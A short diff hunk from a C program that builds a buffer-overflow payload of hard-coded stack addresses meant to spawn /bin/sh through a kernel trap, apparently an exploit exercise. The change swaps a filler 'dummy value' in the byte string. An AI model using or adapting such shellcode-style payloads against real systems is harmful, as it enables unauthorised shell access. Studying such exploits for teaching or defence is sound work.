@@ -43,7 +43,7 @@ int main(void)
                       //"\xf6\xf6\xb7\xbb\xAA\xAA\xAA\xAA" // y array (addy of bin/sh followed by 0 word represented here by filler)
                       "\xFC\x28\xBF\xBF\xAA\xAA\xAA\xAA" // y array (addy of bin/sh followed by 0 word represented here by filler)
                       "\xE5\xB6\xA9\xBB" // trap into kernel followed by
-                      "\xA0\xA0\xA0\xA0" // dummy value
+                      "\x01\x01\x01\x01" // dummy value
                       //"\xf6\xf6\xb7\xbb" // addy of bin/sh (x) 
                       "\xFC\x28\xBF\xBF" // addy of bin/sh (x) 
                       "\xE0\x28\xBF\xBF" // addy of y
